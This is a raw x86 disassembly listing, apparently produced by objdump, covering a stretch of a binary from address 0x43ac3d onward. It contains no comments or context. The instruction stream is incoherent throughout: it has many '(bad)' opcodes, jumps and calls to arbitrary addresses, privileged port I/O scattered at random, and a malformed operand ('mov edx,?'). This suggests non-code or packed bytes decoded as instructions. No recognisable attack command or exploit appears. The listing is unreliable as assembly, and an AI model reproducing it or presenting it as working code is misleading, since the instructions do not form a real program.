  43ac3d:	ror    BYTE PTR [ebx+0xf8f0606],0x27
  43ac44:	sbb    ecx,DWORD PTR [eax]
  43ac46:	or     DWORD PTR [esi+0xd],esp
  43ac49:	mov    bh,0xe0
  43ac4b:	fwait
  43ac4c:	loopne 0x43ac26
  43ac4e:	test   edx,eax
  43ac50:	jle    0x43ac5c
  43ac52:	lea    eax,[esi+0x11]
  43ac55:	dec    eax
  43ac56:	call   0x3cb3c2
  43ac5b:	or     BYTE PTR [esi+0x4],cl
  43ac5e:	mov    eax,ebx
  43ac60:	pusha  
  43ac61:	inc    ebx
  43ac62:	cld    
  43ac63:	add    BYTE PTR [edx],dl
  43ac65:	aad    0x9c
  43ac67:	ret    0xe263
  43ac6a:	push   ebx
  43ac6b:	clc    
  43ac6c:	or     bh,cl
  43ac6e:	ud2    
  43ac70:	adc    ecx,DWORD PTR [esi+edi*4+0x4b542d75]
  43ac77:	cld    
  43ac78:	push   0xfffffffd
  43ac7a:	and    eax,0x7505bcfe
  43ac7f:	les    eax,FWORD PTR [edi+0x62]
  43ac82:	ror    BYTE PTR [ebx+0x98f1186],0xf6
  43ac89:	adc    BYTE PTR [ebx-0x7428c937],al
  43ac8f:	push   ebp
  43ac90:	scas   eax,DWORD PTR es:[edi]
  43ac91:	stos   BYTE PTR es:[edi],al
  43ac92:	call   0xf94949b0
  43ac97:	xor    DWORD PTR [edi],0xc
  43ac9a:	jge    0x43ac64
  43ac9c:	jo     0x43ac69
  43ac9e:	hlt    
  43ac9f:	cdq    
  43aca0:	dec    edx
  43aca1:	clc    
  43aca2:	dec    DWORD PTR [eax]
  43aca4:	(bad)  
  43aca5:	adc    BYTE PTR [ebx-0x74293937],al
  43acab:	inc    ebp
  43acac:	jg     0x43ac56
  43acae:	call   0xed290fb0
  43acb3:	clc    
  43acb4:	loope  0x43ac6c
  43acb6:	test   DWORD PTR [edx+ebx*4-0x2403c979],0x6b0fe3c1
  43acc1:	cmp    eax,0x859b82fc
  43acc6:	xor    BYTE PTR [ebx+0x4df61700],cl
  43accc:	call   0xf937da54
  43acd1:	jmp    0x67072d10
  43acd6:	jne    0x43ac8d
  43acd8:	jb     0x43ad1d
  43acda:	xchg   DWORD PTR [ecx-0x4],ecx
  43acdd:	fild   DWORD PTR [edi-0x5e07b34]
  43ace3:	cs repnz pop ecx
  43ace6:	dec    edi
  43ace7:	mov    esi,0x59074add
  43acec:	clc    
  43aced:	mov    ebp,0xeb5a2c89
  43acf2:	ror    DWORD PTR [eax],1
  43acf4:	test   DWORD PTR [ebx],esp
  43acf6:	(bad)  
  43acf7:	ja     0x43acdb
  43acf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43acfa:	aas    
  43acfb:	js     0x43ad3f
  43acfd:	push   0xffffffeb
  43acff:	push   edx
  43ad00:	shl    DWORD PTR [edx+0x2],0x4
  43ad04:	add    BYTE PTR [edx+0x33],ah
  43ad07:	cmp    eax,0x4026204
  43ad0c:	add    cl,ch
  43ad0e:	rol    BYTE PTR [edi-0x7b],0xff
  43ad12:	inc    esp
  43ad13:	mov    edi,0xc0ee1ecb
  43ad18:	retf   
  43ad19:	push   ss
  43ad1a:	mov    al,0xcb
  43ad1d:	cs mov esi,0x6d26cbc0
  43ad23:	ja     0x43ad10
  43ad25:	loope  0x43acf4
  43ad27:	sub    BYTE PTR [ebp-0x27],cl
  43ad2a:	fdivr  DWORD PTR [edi+edi*8+0x72a43300]
  43ad31:	jno    0x43ad9d
  43ad33:	enter  0x5e17,0xcc
  43ad37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ad38:	scas   eax,DWORD PTR es:[edi]
  43ad39:	push   esi
  43ad3a:	xor    edx,DWORD PTR [eiz*4-0x15f44509]
  43ad41:	add    ebx,ebp
  43ad43:	test   ecx,esi
  43ad45:	jl     0x43ad77
  43ad47:	cmc    
  43ad48:	pusha  
  43ad49:	jns    0x43ad05
  43ad4b:	add    BYTE PTR [esi+0x6ad96241],dh
  43ad51:	(bad)  
  43ad52:	jno    0x43adaa
  43ad54:	stos   BYTE PTR es:[edi],al
  43ad55:	ja     0x43adbe
  43ad57:	lods   al,BYTE PTR ds:[esi]
  43ad58:	daa    
  43ad59:	aaa    
  43ad5a:	mov    ds:0xe74e9bc7,al
  43ad5f:	cmc    
  43ad60:	adc    al,0xc7
  43ad62:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  43ad64:	ror    DWORD PTR [esi],0x1b
  43ad67:	fldl2t 
  43ad69:	jle    0x43adda
  43ad6b:	push   edi
  43ad6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ad6d:	sti    
  43ad6e:	out    0x31,al
  43ad70:	jno    0x43adc2
  43ad72:	ss popa 
  43ad74:	or     eax,0xf0ae0e4
  43ad79:	push   ss
  43ad7a:	mov    ah,0xe1
  43ad7c:	push   0xea0b3aee
  43ad81:	add    eax,edi
  43ad83:	loope  0x43ade5
  43ad85:	push   eax
  43ad86:	ss popa 
  43ad88:	in     eax,0xeb
  43ad8a:	fiadd  WORD PTR [edx]
  43ad8c:	rol    BYTE PTR [edi],cl
  43ad8e:	data16 fldl2t 
  43ad91:	pop    ebp
  43ad92:	add    BYTE PTR ds:0x70f2e981,dl
  43ad98:	mov    ecx,0x566247b5
  43ad9d:	es jmp esp
  43ada0:	xchg   esp,eax
  43ada1:	xor    eax,0x85b588
  43ada6:	jnp    0x43addc
  43ada8:	adc    bh,BYTE PTR [ebx+0xd961e5]
  43adae:	loop   0x43ad53
  43adb0:	loope  0x43ae31
  43adb2:	adc    eax,0x6200d961
  43adb7:	sbb    al,BYTE PTR ds:0x2974ec73
  43adbd:	or     BYTE PTR [edx-0x38],ch
  43adc0:	or     bh,al
  43adc2:	jmp    0x62d48b5b
  43adc7:	adc    ch,BYTE PTR ds:0x55b9748c
  43adcd:	dec    esi
  43adce:	aad    0x1f
  43add0:	lahf   
  43add1:	lock jb 0x43add9
  43add4:	stc    
  43add5:	mov    ebp,DWORD PTR [edx+ecx*4]
  43add8:	mov    eax,edx
  43adda:	jmp    0x6a44873c
  43addf:	xchg   ecx,eax
  43ade0:	or     bh,BYTE PTR [ebx]
  43ade2:	scas   eax,DWORD PTR es:[edi]
  43ade3:	in     al,dx
  43ade4:	fisubr WORD PTR [edi-0x13]
  43ade7:	sub    DWORD PTR ds:[edi-0x1f],ebp
  43adeb:	call   0xd5b49286
  43adf0:	or     esp,ebp
  43adf2:	out    0xd8,eax
  43adf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43adf5:	in     al,0x60
  43adf7:	add    BYTE PTR [ebp+0x3e248c09],cl
  43adfd:	push   ebp
  43adfe:	hlt    
  43adff:	shl    BYTE PTR [ebp+edi*8-0x71984d75],cl
  43ae06:	lock ret 0xe523
  43ae0a:	mov    edi,0x117c1e64
  43ae0f:	ficomp WORD PTR [ecx]
  43ae11:	mov    edi,ecx
  43ae13:	in     eax,0x5d
  43ae15:	fld    DWORD PTR [eax]
  43ae17:	fistp  WORD PTR [edx+0x44]
  43ae1a:	std    
  43ae1b:	in     al,0x61
  43ae1d:	fldpi  
  43ae1f:	add    BYTE PTR [ecx],cl
  43ae21:	in     eax,dx
  43ae22:	fimul  DWORD PTR [ebx+0x4d7d09be]
  43ae28:	add    ebp,DWORD PTR [eax+eax*1+0x47a5cd57]
  43ae2f:	call   0x4478b3
  43ae34:	dec    eax
  43ae35:	and    DWORD PTR [eax*4-0x74987d85],edx
  43ae3c:	push   cs
  43ae3d:	cli    
  43ae3e:	jl     0x43ae85
  43ae40:	mov    bh,0xa4
  43ae42:	inc    esi
  43ae43:	push   eax
  43ae44:	xor    BYTE PTR [edx-0x25fc74f8],dl
  43ae4a:	jge    0x43ae9c
  43ae4c:	mov    edi,0x8d2f9a6
  43ae51:	adc    cl,BYTE PTR [eax]
  43ae53:	cmp    ecx,eax
  43ae55:	adc    BYTE PTR [ebx-0x73],0x38
  43ae59:	cli    
  43ae5a:	add    al,0x0
  43ae5d:	adc    eax,0xa74d7dd1
  43ae62:	int    0x80
  43ae64:	cmp    al,0x73
  43ae66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ae67:	jae    0x43ae7e
  43ae69:	sti    
  43ae6a:	jns    0x43ae74
  43ae6c:	add    DWORD PTR [eax-0x7e],eax
  43ae6f:	or     al,BYTE PTR [eax+0x4f60587]
  43ae75:	outs   dx,BYTE PTR ds:[esi]
  43ae76:	rol    BYTE PTR [eax+0x2de437c],cl
  43ae7c:	je     0x43aebb
  43ae7e:	pusha  
  43ae7f:	mov    eax,0x926067f
  43ae84:	cdq    
  43ae85:	dec    eax
  43ae86:	adc    eax,DWORD PTR ds:0xdc9fc2d7
  43ae8c:	or     edi,ecx
  43ae8e:	adc    DWORD PTR [edx-0x18],0x3e
  43ae92:	xlat   BYTE PTR ds:[ebx]
  43ae93:	jge    0x43aeda
  43ae95:	xor    DWORD PTR [ebx-0x9d0fbd],0x7d
  43ae9c:	and    eax,0x70f09805
  43aea1:	outs   dx,BYTE PTR ds:[esi]
  43aea2:	mov    esi,DWORD PTR [esi]
  43aea4:	hlt    
  43aea5:	cmp    esi,DWORD PTR ds:0x2ee008d8
  43aeab:	icebp  
  43aeac:	clc    
  43aead:	in     eax,0x7b
  43aeaf:	dec    esi
  43aeb0:	cld    
  43aeb1:	xor    BYTE PTR [esp+eax*1-0x7],ch
  43aeb5:	outs   dx,DWORD PTR ds:[esi]
  43aeb6:	push   ds
  43aeb7:	pop    eax
  43aeb8:	inc    esp
  43aeb9:	bound  edi,QWORD PTR [ebx+0x3e]
  43aebc:	in     al,0xd9
  43aebe:	dec    ebp
  43aebf:	fdivr  QWORD PTR [eax+eax*1-0x5a]
  43aec3:	or     dl,BYTE PTR [ecx+0x5a]
  43aec6:	sbb    DWORD PTR [ebx+0x65a15ade],ecx
  43aecc:	jne    0x43aeb9
  43aece:	loope  0x43aed6
  43aed0:	pop    ds
  43aed1:	dec    ebp
  43aed2:	jmp    0x2d95a374
  43aed7:	mov    esi,DWORD PTR [ecx+0xc]
  43aeda:	push   ecx
  43aedb:	sub    BYTE PTR [ebx-0x2],bl
  43aede:	das    
  43aedf:	ror    BYTE PTR [edi+0x4d],1
  43aee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43aee3:	mov    ch,0xf8
  43aee5:	clc    
  43aee6:	jne    0x43aeda
  43aee8:	add    eax,DWORD PTR [edi+0x727649f7]
  43aeee:	jle    0x43af69
  43aef0:	jns    0x43aeda
  43aef2:	dec    edx
  43aef3:	es inc ecx
  43aef5:	add    BYTE PTR [edx+0x73],ah
  43aef8:	enter  0xe713,0x31
  43aefc:	jns    0x43af03
  43aefe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43aeff:	mov    eax,0x6471c033
  43af04:	dec    esp
  43af05:	test   DWORD PTR [edi],edi
  43af07:	in     eax,0xc3
  43af09:	push   eax
  43af0a:	xchg   ecx,eax
  43af0b:	pop    edx
  43af0c:	ins    BYTE PTR es:[edi],dx
  43af0d:	dec    ebx
  43af0e:	(bad)  
  43af10:	add    bl,0x6a
  43af13:	fnstenv [edx-0x34]
  43af16:	fsub   QWORD PTR [ebp-0x64f82cb]
  43af1c:	rcl    BYTE PTR fs:[edx+0x7cfbdbeb],cl
  43af23:	add    al,0x3f
  43af25:	out    dx,eax
  43af26:	add    ch,dh
  43af28:	pop    es
  43af29:	mov    ebx,0x35a5e4fb
  43af2e:	jge    0x43aec0
  43af30:	add    DWORD PTR [ebx-0xe],esp
  43af33:	inc    ebp
  43af34:	fucom  st(5)
  43af36:	add    esp,DWORD PTR [edx+0x73]
  43af39:	call   0xf54c1197
  43af3e:	and    esi,DWORD PTR [esi]
  43af40:	popf   
  43af41:	jmp    0x711850c8
  43af46:	dec    ecx
  43af47:	mov    dh,0x5d
  43af49:	sub    bh,BYTE PTR [eax-0xa]
  43af4c:	retf   
  43af4d:	and    BYTE PTR [edx+0x3e9d961],ch
  43af53:	push   edi
  43af54:	pop    ss
  43af55:	out    dx,eax
  43af56:	xchg   BYTE PTR [eax+ebx*8-0x6218fc17],cl
  43af5d:	aad    0x71
  43af5f:	les    di,DWORD PTR [ecx-0x160b0102]
  43af66:	add    esp,DWORD PTR [edx-0xc]
  43af69:	fild   DWORD PTR [eax+0x5062d924]
  43af6f:	xchg   BYTE PTR [ebx+0x2d],dl
  43af72:	in     al,dx
  43af73:	out    0xac,al
  43af75:	lea    edi,[edx-0x58]
  43af78:	or     DWORD PTR [ebx+0x48],esi
  43af7b:	push   esi
  43af7c:	pop    ecx
  43af7d:	lods   al,BYTE PTR ds:[esi]
  43af7e:	add    ebx,DWORD PTR [esi-0x27]
  43af81:	jmp    0xc31ddc08
  43af86:	mov    ebp,0x7eed7c7
  43af8b:	add    BYTE PTR [edi+0x29],dh
  43af8e:	add    edi,edi
  43af90:	sub    DWORD PTR [eax+0x3e],esp
  43af93:	jge    0x43af33
  43af95:	mov    esi,eax
  43af97:	push   edx
  43af98:	pop    edi
  43af99:	pop    esi
  43af9a:	dec    esi
  43af9b:	dec    ebp
  43af9c:	mov    ss,WORD PTR [ebx-0x66d9d10]
  43afa2:	mov    esp,DWORD PTR [ecx+eax*1+0x7b12f45e]
  43afa9:	cmc    
  43afaa:	mov    esi,DWORD PTR [edx]
  43afac:	pop    eax
  43afad:	xor    al,0x2
  43afb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43afb1:	in     eax,dx
  43afb2:	mov    edi,0x1174a164
  43afb7:	sahf   
  43afb8:	fld    DWORD PTR [edi-0x269a1a07]
  43afbe:	add    BYTE PTR [edi-0x1b02b3a4],bl
  43afc4:	popa   
  43afc5:	fldpi  
  43afc7:	jmp    0x43b021
  43afc9:	and    ecx,DWORD PTR [esp+eiz*4-0x1eb9a253]
  43afd0:	or     ebx,ecx
  43afd2:	dec    edi
  43afd3:	xchg   edi,eax
  43afd4:	xor    DWORD PTR [esi-0x26ddc218],edx
  43afda:	add    BYTE PTR [edx-0x66],ch
  43afdd:	jmp    0x348b:0x760da97d
  43afe4:	jb     0x43b043
  43afe6:	ds cmc 
  43afe8:	adc    dl,BYTE PTR [edi-0x2eda8db0]
  43afee:	mov    esp,DWORD PTR [ecx]
  43aff0:	add    BYTE PTR [edx+0x5c],dl
  43aff3:	push   ecx
  43aff4:	in     eax,0xb0
  43aff6:	add    bl,dl
  43aff8:	push   0x2a
  43affa:	(bad)  
  43affb:	cmp    ebp,DWORD PTR [edx+0x2a85aad5]
  43b001:	xor    eax,0x7a0fc15b
  43b006:	pop    esp
  43b007:	inc    esi
  43b008:	add    bh,bl
  43b00a:	les    eax,FWORD PTR [eax+0x73aa333c]
  43b010:	adc    eax,0x10889bb
  43b015:	inc    eax
  43b016:	mov    cs,WORD PTR [edx]
  43b018:	cmp    bh,0x1
  43b01b:	test   BYTE PTR ds:0x7c80dd36,0x3
  43b022:	fld    DWORD PTR [ecx]
  43b024:	je     0x43b02b
  43b026:	pop    edi
  43b027:	mov    eax,0x9203e7f
  43b02c:	cdq    
  43b02d:	clc    
  43b02e:	sbb    eax,DWORD PTR ds:0xdc9e82d7
  43b034:	or     ecx,DWORD PTR [ecx-0x917ad7e]
  43b03a:	iret   
  43b03b:	jge    0x43b082
  43b03d:	xor    DWORD PTR [edx+0x57bcf043],0x1e
  43b044:	jmp    FWORD PTR [esp+esi*8+0x70]
  43b048:	or     al,0x30
  43b04a:	(bad)  
  43b04b:	in     al,dx
  43b04c:	cmp    esi,edi
  43b04e:	and    eax,0xf48f8209
  43b053:	clc    
  43b054:	inc    DWORD PTR [eax]
  43b056:	add    BYTE PTR [esi+0x4],dh
  43b059:	mov    edx,DWORD PTR [esi+0x9]
  43b05c:	inc    esi
  43b05d:	push   0x7b
  43b05f:	hlt    
  43b060:	adc    ah,BYTE PTR [edi+ebx*1]
  43b063:	xchg   ecx,eax
  43b064:	add    BYTE PTR [ebx+0x4d7cf146],cl
  43b06a:	xchg   ebx,eax
  43b06b:	add    bh,0x83
  43b06e:	mov    DWORD PTR [ecx],0x5d7cd0fd
  43b074:	mov    edi,esi
  43b076:	or     al,0xf6
  43b078:	jl     0x43b0ef
  43b07a:	push   ebx
  43b07b:	mov    ds:0xae8b5100,eax
  43b080:	push   edx
  43b081:	call   0x7c4ee8
  43b086:	bound  ebp,QWORD PTR [edi-0x41]
  43b089:	adc    ebx,edi
  43b08b:	xor    dh,ch
  43b08d:	xor    BYTE PTR [esi-0x28071b7c],0xb5
  43b094:	lock dec edi
  43b096:	jmp    0xb0d29d6
  43b09b:	mov    bh,0xe9
  43b09d:	clc    
  43b09e:	or     eax,0xdf03bf70
  43b0a3:	mov    dl,0xf4
  43b0a5:	sbb    BYTE PTR [esi-0x18071b6c],0x4d
  43b0ac:	call   0x78ff89ff
  43b0b1:	leave  
  43b0b2:	cli    
  43b0b3:	pop    esi
  43b0b4:	jmp    0x3:0xbf6fddf8
  43b0bb:	fbstp  TBYTE PTR [edx-0x1bd97d0c]
  43b0c1:	in     al,0xf8
  43b0c3:	mov    esi,DWORD PTR ds:0x27e708e8
  43b0c9:	out    0xf8,al
  43b0cb:	mov    ch,0x8d
  43b0cd:	dec    esi
  43b0ce:	fcom   QWORD PTR [eax]
  43b0d0:	xchg   DWORD PTR [esp+eax*4-0xaf7256c],edi
  43b0d7:	popf   
  43b0d8:	repz ja 0x43b09e
  43b0db:	pop    esi
  43b0dc:	jne    0x43b09a
  43b0de:	or     bh,ah
  43b0e0:	iret   
  43b0e1:	jmp    0x12fc:0x417d85f8
  43b0e8:	ja     0x43b0ad
  43b0ea:	test   BYTE PTR [edx+ebp*1+0x436df670],ah
  43b0f1:	add    bl,0x5e
  43b0f4:	jne    0x43b0b2
  43b0f6:	or     bh,ah
  43b0f8:	imul   cl
  43b0fa:	clc    
  43b0fb:	push   ebp
  43b0fc:	fldcw  WORD PTR [edx+0x69]
  43b0ff:	dec    esi
  43b100:	(bad)  
  43b102:	add    BYTE PTR [esi+eax*1-0x71],0xeb
  43b107:	out    0xa5,al
  43b109:	mov    DWORD PTR [edi-0x58],edi
  43b10c:	and    eax,0xac9d571a
  43b111:	paddusb mm1,QWORD PTR [ebx-0x70]
  43b115:	jmp    0xce61501d
  43b11a:	adc    ch,0xd3
  43b11d:	fs loop 0x43b120
  43b120:	or     BYTE PTR [edi+edx*2],al
  43b123:	jns    0x43b0d5
  43b125:	add    eax,0x50227ebc
  43b12a:	sbb    ah,bl
  43b12c:	xor    edi,edi
  43b12e:	ds jmp 0x43b19f
  43b131:	sbb    eax,0xd3a580de
  43b136:	fs mov edx,0x852703d8
  43b13c:	pop    eax
  43b13d:	add    eax,0xdb603eba
  43b142:	out    0x80,al
  43b144:	add    al,0x6
  43b146:	por    mm4,mm6
  43b149:	popf   
  43b14a:	and    eax,0x1b50184b
  43b14f:	dec    edi
  43b150:	out    0xfd,eax
  43b152:	xchg   esp,eax
  43b153:	(bad)  
  43b154:	cdq    
  43b155:	adc    al,0x95
  43b157:	jle    0x43b0e2
  43b159:	dec    edi
  43b15a:	xchg   ebp,eax
  43b15b:	sti    
  43b15c:	es stos DWORD PTR es:[edi],eax
  43b15e:	jb     0x43b1d0
  43b160:	pop    esi
  43b161:	lods   al,BYTE PTR ds:[esi]
  43b162:	jb     0x43b125
  43b164:	fiadd  WORD PTR [ecx]
  43b166:	fist   WORD PTR [edi-0x359d175e]
  43b16c:	mov    ah,0xf0
  43b16e:	fnstcw WORD PTR [eax+ebp*8-0x30]
  43b172:	push   0xffffffe6
  43b174:	dec    edx
  43b175:	push   edx
  43b176:	add    DWORD PTR [ebx],edx
  43b178:	pop    edx
  43b179:	pop    esi
  43b17a:	(bad)  
  43b17c:	in     eax,dx
  43b17d:	and    esi,edi
  43b17f:	imul   eax,DWORD PTR [eax-0x2e],0xb7007047
  43b186:	jmp    0xd281c616
  43b18b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b18c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b18d:	ss xchg bh,bl
  43b190:	push   es
  43b191:	out    0x19,eax
  43b193:	mov    ch,0xe6
  43b195:	popa   
  43b196:	fld    st(1)
  43b198:	sbb    DWORD PTR [esi],0x94d57b5c
  43b19e:	inc    ebx
  43b19f:	mov    WORD PTR [edi+0x8],fs
  43b1a2:	das    
  43b1a3:	stc    
  43b1a4:	repnz fsub QWORD PTR [edx]
  43b1a7:	sbb    BYTE PTR [eax-0x59],ah
  43b1aa:	ror    DWORD PTR [ebx-0xed107d8],1
  43b1b0:	in     al,dx
  43b1b1:	repnz or ebx,DWORD PTR es:[esi+0x27fdfe1e]
  43b1b9:	mov    ebx,0x884983d7
  43b1be:	test   cl,ah
  43b1c0:	push   es
  43b1c1:	sbb    dl,BYTE PTR gs:[edi+0x70]
  43b1c5:	pop    ds
  43b1c6:	fisttp QWORD PTR [ecx-0x3c61d31d]
  43b1cc:	sbb    eax,0x35c50eed
  43b1d1:	cmc    
  43b1d2:	push   cs
  43b1d3:	lds    ebp,FWORD PTR ds:0x9cc50eed
  43b1d9:	sbb    al,0xee
  43b1db:	cmp    ebp,0x4
  43b1de:	xchg   esp,eax
  43b1df:	dec    esi
  43b1e0:	pslld  mm6,QWORD PTR ds:[ebx]
  43b1e4:	fimul  WORD PTR [edi+0x2c]
  43b1e7:	cmp    al,0xde
  43b1e9:	add    BYTE PTR ds:0xe42685db,cl
  43b1ef:	mov    eax,ds:0x84400056
  43b1f4:	loop   0x43b253
  43b1f6:	mov    eax,0x48584184
  43b1fb:	cwde   
  43b1fc:	dec    eax
  43b1fd:	mov    esi,DWORD PTR [ebp-0x6f]
  43b200:	add    eax,0x5184974e
  43b205:	xor    BYTE PTR [esi+eiz*4+0x257d5250],cl
  43b20c:	push   ds
  43b20d:	dec    edx
  43b20e:	dec    ebx
  43b20f:	(bad)  
  43b210:	jne    0x43b1d6
  43b212:	jae    0x5d8226cf
  43b218:	mov    ebp,0x8be4e0ff
  43b21d:	inc    ebp
  43b21e:	(bad)  
  43b21f:	lods   eax,DWORD PTR ds:[esi]
  43b220:	jge    0x43b268
  43b222:	imul   eax,DWORD PTR [ecx+ecx*8-0x7114418],0xffffffff
  43b22a:	mov    BYTE PTR [ecx],bl
  43b22c:	add    al,0x85
  43b22e:	dec    ebx
  43b22f:	mov    DWORD PTR [ebx],eax
  43b231:	xor    DWORD PTR [eax],0xfffffff0
  43b234:	fmul   QWORD PTR [esi]
  43b236:	jp     0x43b2b2
  43b238:	in     al,dx
  43b239:	push   eax
  43b23a:	add    bh,dl
  43b23c:	div    BYTE PTR [ebx-0x42]
  43b23f:	xor    al,0x8f
  43b241:	inc    DWORD PTR [eax+esi*8-0x7554b984]
  43b248:	dec    edx
  43b249:	mov    edx,?
  43b24b:	test   cl,cl
  43b24d:	call   0xf938c552
  43b252:	(bad)  
  43b253:	cmp    BYTE PTR [ecx],bl
  43b255:	add    al,0x85
  43b257:	jnp    0x43b1e2
  43b259:	cmc    
  43b25a:	add    BYTE PTR [eax-0x10],0x7c
  43b25e:	inc    esi
  43b25f:	fisttp DWORD PTR [edx-0x7bb66fae]
  43b265:	leave  
  43b266:	call   0x3ca046
  43b26b:	bound  ebp,QWORD PTR [edi-0x49]
  43b26e:	add    ebx,edi
  43b270:	das    
  43b271:	push   0xe946e0fd
  43b276:	mov    bl,BYTE PTR [edi]
  43b278:	lods   al,BYTE PTR ds:[esi]
  43b279:	push   ebx
  43b27a:	test   DWORD PTR [edx+eax*1+0x7b4ac975],esp
  43b281:	jmp    0x43b27b
  43b283:	dec    ebp
  43b284:	je     0x43b23d
  43b286:	add    ebx,edi
  43b288:	xor    ch,BYTE PTR [eax-0x3]
  43b28b:	loopne 0x43b2c8
  43b28d:	jmp    0x6f664f16
  43b292:	dec    edx
  43b293:	retf   0x75e1
  43b296:	leave  
  43b297:	cmp    al,BYTE PTR [ebx]
  43b299:	in     al,dx
  43b29a:	clc    
  43b29b:	sbb    eax,0xdf03b774
  43b2a0:	xor    ch,BYTE PTR [eax-0x3]
  43b2a3:	loopne 0x43b270
  43b2a5:	call   0x70264f2e
  43b2aa:	push   edx
  43b2ab:	fiadd  WORD PTR [ebp+esi*2-0x37]
  43b2af:	or     ch,BYTE PTR [ebx-0x14]
  43b2b2:	clc    
  43b2b3:	add    ch,ch
  43b2b5:	jae    0x43b26e
  43b2b7:	add    ebx,edi
  43b2b9:	mov    dl,0x67
  43b2bb:	std    
  43b2bc:	loopne 0x43b279
  43b2be:	call   0x50d1d247
  43b2c3:	push   eax
  43b2c4:	fistp  QWORD PTR ds:0xe0f3e7b0
  43b2ca:	call   0x34749cc7
  43b2cf:	mov    esp,DWORD PTR [edi]
  43b2d1:	xchg   edx,eax
  43b2d2:	push   edx
  43b2d3:	test   DWORD PTR [edx+ebp*8-0x5a0874],ebx
  43b2da:	add    ebx,0x6e
  43b2dd:	ins    DWORD PTR es:[edi],dx
  43b2de:	ret    
  43b2df:	jae    0x43b342
  43b2e1:	jae    0x43b297
  43b2e3:	clc    
  43b2e4:	(bad)  
  43b2e6:	daa    
  43b2e7:	xor    al,0xd9
  43b2e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b2ea:	aad    0x52
  43b2ec:	out    0xf,eax
  43b2ee:	ret    0x7a6b
  43b2f1:	add    bh,al
  43b2f3:	and    DWORD PTR [ecx-0xe3b9b2b],0xffffffdb
  43b2fa:	push   0xffffffbb
  43b2fc:	pop    edx
  43b2fd:	push   esp
  43b2fe:	and    eax,0xa58de8e8
  43b303:	jge    0x43b2a5
  43b305:	xor    eax,0xaa923e73
  43b30a:	jb     0x43b2c2
  43b30c:	in     al,0x7d
  43b30e:	inc    ecx
  43b30f:	fmul   QWORD PTR [edi-0x511878ff]
  43b315:	adc    eax,0xe50080e6
  43b31a:	test   dl,ch
  43b31c:	and    BYTE PTR [esi],0x0
  43b31f:	arpl   WORD PTR [ecx+0x16],dx
  43b322:	dec    esi
  43b323:	sbb    eax,0xa8549db0
  43b328:	xor    ebx,edi
  43b32a:	push   cs
  43b32b:	jno    0x43b37e
  43b32d:	into   
  43b32e:	push   ecx
  43b32f:	int    0xb3
  43b331:	std    
  43b332:	and    DWORD PTR [edi-0x19],ecx
  43b335:	jmp    0xae18:0xe100265b
  43b33c:	add    bl,BYTE PTR [edi+0x14]
  43b33f:	das    
  43b340:	jnp    0x43b365
  43b342:	leave  
  43b343:	push   esp
  43b344:	cmp    DWORD PTR [edx],ecx
  43b346:	stos   BYTE PTR es:[edi],al
  43b347:	jb     0x43b2ff
  43b349:	mov    ebp,0xbae70f19
  43b34e:	pop    ebx
  43b34f:	es add cl,ah
  43b352:	sbb    BYTE PTR [esi-0xebd0fe],cl
  43b358:	jp     0x43b37d
  43b35a:	leave  
  43b35b:	fs push ecx
  43b35d:	fisubr WORD PTR [edx-0x8339e00]
  43b363:	test   eax,0x840084f6
  43b368:	lods   eax,DWORD PTR ds:[esi]
  43b369:	test   DWORD PTR [edx-0x3f],ebx
  43b36c:	push   ebp
  43b36d:	popa   
  43b36e:	jle    0x43b33b
  43b370:	(bad)  
  43b371:	cli    
  43b372:	call   0x7230:0x99e939c0
  43b379:	scas   eax,DWORD PTR es:[edi]
  43b37a:	not    DWORD PTR [ecx+0x24400b6]
  43b380:	test   BYTE PTR [ebp+0x35c15c55],ch
  43b386:	popa   
  43b387:	jl     0x43b354
  43b389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b38a:	enter  0x3098,0x6c
  43b38e:	jp     0x43b3a5
  43b390:	push   edx
  43b391:	(bad)  
  43b392:	out    dx,eax
  43b393:	idiv   BYTE PTR [ecx-0x6a]
  43b396:	inc    esp
  43b397:	add    al,BYTE PTR [ebp+ebp*4-0xa3ea3db]
  43b39e:	pusha  
  43b39f:	jl     0x43b36c
  43b3a1:	jbe    0x43b33b
  43b3a3:	cwde   
  43b3a4:	xor    BYTE PTR [edx+esi*4+0x11],bl
  43b3a8:	push   ebx
  43b3a9:	jb     0x43b37a
  43b3ab:	test   cl,0x56
  43b3ae:	add    al,0x2
  43b3b0:	test   BYTE PTR ds:0xd5c15bf5,ch
  43b3b6:	pusha  
  43b3b7:	jl     0x43b384
  43b3b9:	inc    esi
  43b3ba:	push   0xffffff9b
  43b3bc:	hlt    
  43b3bd:	cdq    
  43b3be:	pop    eax
  43b3bf:	cwde   
  43b3c0:	xor    BYTE PTR [edx+0xf],ah
  43b3c3:	imul   DWORD PTR [ecx-0x7bfe3bca]
  43b3c9:	sub    eax,0x95c15bc5
  43b3ce:	pusha  
  43b3cf:	jl     0x43b39c
  43b3d1:	push   ss
  43b3d2:	cmp    BYTE PTR [ebx-0xec59f0c],dl
  43b3d8:	mov    eax,DWORD PTR [eax]
  43b3da:	fisubr WORD PTR [esi]
  43b3dc:	jg     0x43b42b
  43b3de:	addr16 jge 0x43b45b
  43b3e1:	cld    
  43b3e2:	add    BYTE PTR [esi],al
  43b3e4:	adc    ecx,DWORD PTR [ecx]
  43b3e6:	test   DWORD PTR [esi],edi
  43b3e8:	fiadd  DWORD PTR [eax]
  43b3ea:	add    BYTE PTR [eax],dl
  43b3ec:	mov    esi,0x89cb8510
  43b3f1:	aaa    
  43b3f2:	mov    edi,DWORD PTR [esi]
  43b3f4:	jmp    0xfd4cad26
  43b3f9:	jg     0x43b417
  43b3fb:	je     0x43b380
  43b3fd:	jp     0x43b3fb
  43b3ff:	xor    al,bl
  43b401:	jg     0x43b450
  43b403:	movd   eax,mm7
  43b406:	je     0x43b462
  43b408:	jle    0x43b3c8
  43b40a:	je     0x43b46a
  43b40c:	adc    BYTE PTR [edx-0x4],0xb0
